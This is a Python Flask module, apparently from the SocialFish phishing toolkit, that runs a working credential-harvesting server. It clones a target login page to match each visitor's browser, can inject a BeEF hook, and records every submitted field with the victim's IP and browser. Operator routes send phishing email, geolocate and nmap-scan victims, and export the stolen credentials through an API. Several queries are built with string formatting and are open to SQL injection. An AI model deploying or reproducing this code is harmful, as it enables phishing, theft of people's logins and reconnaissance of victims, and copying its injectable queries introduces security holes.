from flask import Flask, request, render_template, jsonify, redirect, g, flash, Blueprint, current_app
from .core.view import head
from .core.scansf import nScan
from .core.clonesf import clone
from .core.dbsf import initDB
from .core.genToken import genToken, genQRCode
from .core.sendMail import sendMail
from .core.tracegeoIp import tracegeoIp
from .core.cleanFake import cleanFake
from .core.genReport import genReport
from .core.report import generate_unique #>> new line
from datetime import date

from .auth import login_manager, User, users
import colorama
import sqlite3
import flask_login
import os


socialbp = Blueprint('socialbp', __name__)

# Inicia uma conexao com o banco antes de cada requisicao
@socialbp.before_request
def before_request():
    DATABASE = current_app.config['DATABASE']
    g.db = sqlite3.connect(DATABASE)

# Finaliza a conexao com o banco apos cada conexao
@socialbp.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0

    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")

    for i in select_clicks:
        count = i[0]

    count = count - countCreds()
    return count

#----------------------------------------

# definicoes de login
@login_manager.user_loader
def user_loader(email):
    if email not in users:
        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in users:
        return

    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']

    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@socialbp.route('/neptune', methods=['GET', 'POST'])
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        # se o usuario estiver logado retorna para a pagina de credenciais
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        # caso contrario retorna para a pagina de login
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        email = request.form['email']
        try:
            # caso sejam corretas
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                # torna autentico
                flask_login.login_user(user)
                # retorna acesso a pagina restrita
                return redirect('/creds')
            # contrario retorna erro
            else:
                # temporario
                return "bad"
        except:
            return "bad"

# funcao onde e realizada a renderizacao da pagina para a vitima
@socialbp.route("/")
def getLogin():
    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
    if sta == 'clone':
        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        template_path = 'fake/{}/{}/index.html'.format(agent, o)
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    # caso seja configurada para custom
    else:
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@socialbp.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser)
        bversion = str(request.user_agent.version)
        platform = str(request.user_agent.platform)
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        cur = g.db
        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@socialbp.route('/configure', methods=['POST'])
def echo():
    global url, red, sta, beef
    red = request.form['red']
    sta = request.form['status']
    beef = request.form['beef']

    if sta == 'clone':
        url = request.form['url']
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    cur = g.db
    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
    g.db.commit()
    return redirect('/creds')

# pagina principal do dashboard
@socialbp.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)

# pagina para envio de emails
@socialbp.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log 
@socialbp.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        sql = "SELECT jdoc FROM creds where id = {}".format(id)
        cur = g.db
        credInfo = cur.execute(sql).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@socialbp.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except:
        return "Network Error"

# rota para scan do nmap
@socialbp.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@socialbp.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
        cur.execute(upsql)
        g.db.commit()
        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        genQRCode(token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@socialbp.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        DATABASE = current_app.config['DATABASE']
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@socialbp.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@socialbp.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@socialbp.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#--------------------------------------------------------------------------------------------------------------------------------
#LOGIN VIEWS

@socialbp.route('/logout')
def logout():
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    return 'Unauthorized'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE 
@socialbp.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):    
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        cur = g.db
        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@socialbp.route("/api/getJson/<key>", methods=['GET'])
def getJson(key): 
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@socialbp.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    global url, red, sta, beef
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            red = content['red']
            beef = content['beef']
            if content['sta'] == 'clone':
                sta = 'clone'
                url = content['url']
            else:
                sta = 'custom'
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            cur = g.db
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@socialbp.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except:
            content = {'status':'bad'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@socialbp.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        return jsonify(nScan(ip))
    else:
        content = {'status':'bad'}
        return jsonify(content)

@socialbp.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        urls = cur.execute("SELECT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        comp = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})        
